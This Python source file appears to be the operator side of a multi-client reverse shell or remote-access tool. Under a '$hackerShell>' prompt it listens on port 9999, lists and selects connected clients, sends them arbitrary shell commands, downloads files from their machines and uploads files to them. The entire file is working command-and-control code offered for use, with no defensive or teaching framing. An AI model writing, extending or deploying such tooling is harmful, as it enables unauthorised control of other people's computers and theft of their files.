import socket
import sys
import threading
import os
users=[]
'''
stores dict :
{
    "conn":conn,
    "cwd":cwd,
    "add":add
}
'''

class Server:
    def __init__(self) -> None:
        self.IP=""
        self.PORT=9999
        self.SERVER=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.bind_socket()
        self.SERVER.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.SERVER.setblocking(1)
        self.SERVER.listen()
        print("[LISTENING] Waiting for New Connection...")
    def get_port(self):
        return self.PORT

    def bind_socket(self):
        try:
            self.SERVER.bind((self.IP,self.PORT))
        except socket.error as e:
            print(f"[EXCEPTION] {e}")
            self.bind_socket()
    
    def accept_connection(self):
        try:
            while True:
                conn,add=self.SERVER.accept()
                cwd=conn.recv(1024).decode()
                name=conn.recv(1024).decode()
                print(f"[NEW CONNECTION] Established connection, IP:{self.IP},PORT:{self.PORT}\n$hackerShell>",end="")
                # self.send_command(conn,cwd)
                users.append({"name":name,"conn":conn,"cwd":cwd,"add":add})
                # conn.close()
        except Exception as e:
            print(e)

    def send_command(self,conn,cwd,id):
        global users
        print(cwd,end="")
        while True:
            try:
                command=input().strip()
                if not command:
                    print(cwd,end="")
                    continue
                
                if command=="switch" or command=="break" or command=="quit":
                    break
                
                if command=="exit":
                    conn.close()
                    self.SERVER.close()
                    sys.exit()
                if command[:2]=="cd":
                    conn.send(command.encode())
                    users[id]["cwd"]=conn.recv(1024*32).decode()
                    print(users[id]["cwd"],end="")
                    continue
                
                if command=="cwd":
                    conn.send(command.encode())
                    response=conn.recv(1024).decode()
                    print(response,end="")
                    continue

                if command[:3]=="get":
                    try:
                        conn.send(command.encode())
                        size=int(conn.recv(1024).decode())
                        with open(command[4:],"wb") as f:
                            data=conn.recv(1024)
                            count=1
                            while data:
                                f.write(data)
                                print(f"{round(count*(1024/size)*100,2)}% Downloaded",end="\r")
                                if len(data)<1024: break
                                data=conn.recv(1024)
                                count+=1
                        print("File Downloaded Successfully...")
                        print(users[id]["cwd"],end="")
                    except Exception as e:
                        print(e)
                        print("File Doesnt Exist")
                    continue
                if command[:4]=="send":
                    try:
                        conn.send(command.encode())
                        size=os.stat(os.path.join(os.getcwd(),command[5:])).st_size
                        # print(f"{size}")
                        # print(str(size).encode())
                        conn.send(str(len(str(size))).encode())
                        conn.send(str(size).encode())
                        print(str(len(str(size))).encode())
                        print(str(size).encode())
                        with open(os.path.join(os.getcwd(),command[5:]),"rb") as f:
                            count=0
                            data=f.read(1024)
                            while data:
                                conn.send(data)
                                count+=1
                                print(f"{round(count*(1024/size)*100,2)}% Transferred",end="\r")
                                data=f.read(1024)
                        print("File Downloaded Successfully...")
                        print(users[id]["cwd"])
                    except Exception as e:
                        print(e)
                        print("File Not found at",os.path.join(os.getcwd(),command[5:]))
                    continue

                if command.encode():
                    conn.send(command.encode())
                    response=conn.recv(1024*32).decode()
                    print(response,end="")
            except Exception as e:
                print(e)
                conn.close()
                users.pop(id)
                break

def start_shell(server:Server):
    while True:
        command=input("$hackerShell>").strip()
        if "list" == command:
            show_clients()
        elif "select"==command[:6]:
            select_client(command,server)
        else:
            print("Not a Valid Command")

def show_clients():
    global users
    c=0
    print("--------Clients--------")
    # print(users)
    i=0
    # users=list(set(users))
    while i<len(users) and len(users):
        try:
            item=users[i]
            item.get("conn").send(' '.encode())
            item.get("conn").recv(1024*1024)
        except:
            users.pop(i)
            i-=1
            # print(users)
            continue
        print(f"{c}. {item['name']} at {item['add'][0]}:{item['add'][1]}")
        c+=1
        i+=1
    if not len(users):
        print("No Client Active...")


def select_client(cmd:str,server:Server):
    try:    
        choice=int(cmd.replace("select",""))
        if choice<len(users):
            conn=users[choice]["conn"]
            cwd=users[choice]["cwd"]
            server.send_command(conn,cwd,choice)

    except Exception as e:
        print(e)
        print("invalid input")

def start(server):
    acceptThread=threading.Thread(target=server.accept_connection)
    acceptThread.daemon=True
    acceptThread.start()
    shellThread=threading.Thread(target=start_shell,args=[server])
    shellThread.daemon=True
    shellThread.start()
    acceptThread.join()
    shellThread.join()

if __name__=="__main__":
    sock=Server()
    # sock.accept_connection()
    start(sock)
